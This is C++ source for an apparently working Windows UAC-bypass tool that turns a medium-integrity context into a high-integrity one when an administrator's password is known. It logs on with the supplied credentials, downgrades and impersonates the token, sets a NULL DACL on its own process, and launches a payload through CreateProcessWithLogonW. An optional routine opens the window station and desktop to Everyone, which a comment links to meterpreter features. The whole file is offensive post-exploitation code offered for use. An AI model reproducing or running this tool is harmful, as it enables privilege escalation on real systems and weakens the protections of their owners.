//Small c++ code to create High IL from Medium IL when local admin password is known
//https://twitter.com/splinter_code/status/1457589164002643971
//Based on: https://twitter.com/splinter_code/status/1458054161472307204
#include <Windows.h>
#include <sddl.h>
#include <stdio.h>
#include <AclAPI.h>
#pragma comment(lib,"Advapi32.lib")
#pragma warning(disable:4996)


wchar_t WinStationName[256];
BOOL desktop = FALSE;
HANDLE Login(wchar_t* username,wchar_t* domain,wchar_t* password) {
    HANDLE token = NULL;
    if (!LogonUserW(username, domain, password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &token)) {
        wprintf(L"ERROR[LogonUserw]: %d\n", GetLastError());
        exit(0);
    }
    
    return token;
}
HANDLE Downgrade(HANDLE token) {
    const wchar_t sid_string[] = L"S-1-16-8192";
    HANDLE dup_token = NULL;
    TOKEN_MANDATORY_LABEL integrity;
    PSID  sid = NULL;
    ConvertStringSidToSidW(sid_string, &sid);
    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &dup_token)) {
        wprintf(L"ERROR[DuplicateToken]: %d\n", GetLastError());
        exit(0);
    }
    ZeroMemory(&integrity, sizeof(integrity));
    integrity.Label.Attributes = SE_GROUP_INTEGRITY;
    integrity.Label.Sid = sid;
    if (SetTokenInformation(dup_token, TokenIntegrityLevel, &integrity, sizeof(integrity) + GetLengthSid(sid)) == 0) {
        wprintf(L"ERROR[SetTokenInformation]: %d\n", GetLastError());
    }
    LocalFree(sid);
    return dup_token;
}
BOOL SetPermssion(){
    HANDLE process = NULL;
    process = GetCurrentProcess();
    if (SetSecurityInfo(process, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        return TRUE;
    }
    return FALSE;
}

VOID Execute(HANDLE token,wchar_t* username,wchar_t* domain,wchar_t* password)

{
   
    if (!ImpersonateLoggedOnUser(token)) {
        wprintf(L"ERROR[ImpersonateLoggedOnUser]: %d\n", GetLastError());
        exit(0);
    }
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    LPVOID env;

    wchar_t desktop_name[256];

    wsprintf(desktop_name, L"%s\\default", WinStationName);
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    if (desktop) {
        si.lpDesktop = (LPWSTR)desktop_name;
    }
    

    if (!CreateProcessWithLogonW(username, password, domain, LOGON_NETCREDENTIALS_ONLY, L"C:\\tools\\test.exe", NULL, CREATE_NO_WINDOW, NULL, L"C:\\windows\\tasks", &si, &pi)) {
        wprintf(L"ERROR[CreateProcessWithLogonw]: %d\n", GetLastError());
        exit(0);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
}

void SetWinDesktopPermission() {
    const char everyone_desktop[] = "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
    const char everyone_winstation[] = "(A;NP;0xf037f;;;WD)";
    DWORD success = 0;
    BOOL aclpresent;
    BOOL defaultacl;
    HWINSTA hwinstaold = GetProcessWindowStation();
    DWORD lengthNeeded;
    PACL Desktop_ACL;
    PACL Winstation_ACL;
    PACL Desktop_NewACL;
    PACL Winstation_NewACL;
    PSECURITY_DESCRIPTOR Desktop_SD;
    PSECURITY_DESCRIPTOR Winstation_SD;
    PSECURITY_DESCRIPTOR Desktop_NewSD;
    PSECURITY_DESCRIPTOR Winstation_NewSD;
    LPSTR Desktop_ACLstring;
    LPSTR Winstation_ACLstring;
    char* Desktop_NewACLstring = NULL;
    char* Winstation_NewACLstring = NULL;
    desktop = TRUE;
    memset(WinStationName, 0, sizeof(WinStationName));
    GetUserObjectInformationW(hwinstaold, UOI_NAME, WinStationName, 256, &lengthNeeded);



    HWINSTA hwinsta = OpenWindowStationW(WinStationName, FALSE, READ_CONTROL | WRITE_DAC);

    if (!SetProcessWindowStation(hwinsta)) {
        wprintf(L"ERROR[SetProcessWindowStation]: %d\n", GetLastError());
        exit(0);
    }

    HDESK hdesk = OpenDesktop(L"default", 0, FALSE, READ_CONTROL | WRITE_DAC | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS);
    if (hdesk == NULL) {
        wprintf(L"ERROR[OpenDesktop]: %d\n", GetLastError());
        exit(0);
    }
    if (!SetProcessWindowStation(hwinstaold)) {
        wprintf(L"ERROR[SetProcessWindowStation2]: %d\n", GetLastError());
        exit(0);
    }
    success = GetSecurityInfo(hdesk, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &Desktop_ACL, NULL, &Desktop_SD);
    if (success != ERROR_SUCCESS) {
        wprintf(L"ERROR[GetSecurityInfo]: %d\n", GetLastError());
        exit(0);
    }
    success = ConvertSecurityDescriptorToStringSecurityDescriptorA(Desktop_SD, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &Desktop_ACLstring, NULL);
    if (success == 0) {
        wprintf(L"ERROR[ConvertSecurityDescriptorToStringSecurityDescriptorA]: %d\n", GetLastError());
        exit(0);
    }
    success = GetSecurityInfo(hwinstaold, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &Winstation_ACL, NULL, &Winstation_SD);
    if (success != ERROR_SUCCESS) {
        wprintf(L"ERROR[GetSecurityInfo2]: %d\n", GetLastError());
        exit(0);
    }
    success = ConvertSecurityDescriptorToStringSecurityDescriptorA(Winstation_SD, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &Winstation_ACLstring, NULL);
    if (success == 0) {
        wprintf(L"ERROR[ConvertSecurityDescriptorToStringSecurityDescriptorA]: %d\n", GetLastError());
        exit(0);
    }

    Desktop_NewACLstring = (char*)malloc(strlen(Desktop_ACLstring) + sizeof(everyone_desktop) + 1);
    Winstation_NewACLstring = (char*)malloc(strlen(Winstation_ACLstring) + sizeof(everyone_winstation) + 1);
    sprintf(Desktop_NewACLstring, "%s%s", Desktop_ACLstring, everyone_desktop);
    sprintf(Winstation_NewACLstring, "%s%s", Winstation_ACLstring, everyone_winstation);

    if (ConvertStringSecurityDescriptorToSecurityDescriptorA(Desktop_NewACLstring, SDDL_REVISION_1, &Desktop_NewSD, NULL) == 0) {
        wprintf(L"ERROR[ConvertStringSecurityDescriptorToSecurityDescriptorA]: %d\n", GetLastError());

    }

    if (ConvertStringSecurityDescriptorToSecurityDescriptorA(Winstation_NewACLstring, SDDL_REVISION_1, &Winstation_NewSD, NULL) == 0) {
        wprintf(L"ERROR[ConvertStringSecurityDescriptorToSecurityDescriptorA]: %d\n", GetLastError());

    }
    if (GetSecurityDescriptorDacl(Desktop_NewSD, &aclpresent, &Desktop_NewACL, &defaultacl)) {
        SetSecurityInfo(hdesk, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, Desktop_NewACL, NULL);
    }
    if (GetSecurityDescriptorDacl(Winstation_NewSD, &aclpresent, &Winstation_NewACL, &defaultacl)) {
        SetSecurityInfo(hwinstaold, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, Winstation_NewACL, NULL);
    }
    free(Desktop_NewACLstring);
    free(Winstation_NewACLstring);
    LocalFree(Desktop_ACLstring);
    LocalFree(Desktop_SD);
    LocalFree(Desktop_NewSD);
    LocalFree(Winstation_ACLstring);
    LocalFree(Winstation_SD);
    LocalFree(Winstation_NewSD);
    CloseWindowStation(hwinsta);
    CloseDesktop(hdesk);
}
int wmain(int argc,wchar_t* argv[])
{
    //Elevate2.exe username domain password
    HANDLE token = Downgrade(Login(argv[1],argv[2],argv[3]));
    if (token != NULL) {
        wprintf(L"Token IL set Medium\n");
        if (SetPermssion()) {

          
            wprintf(L"Process DACL set to EVERYONE FULL\n");
            //Uncomment line below to change DACL of desktop object. Without it some features like screenshot in meterpreter will fail.
            //SetWinDesktopPermission();
            Execute(token,argv[1],argv[2],argv[3]);
        }
    }
}
 
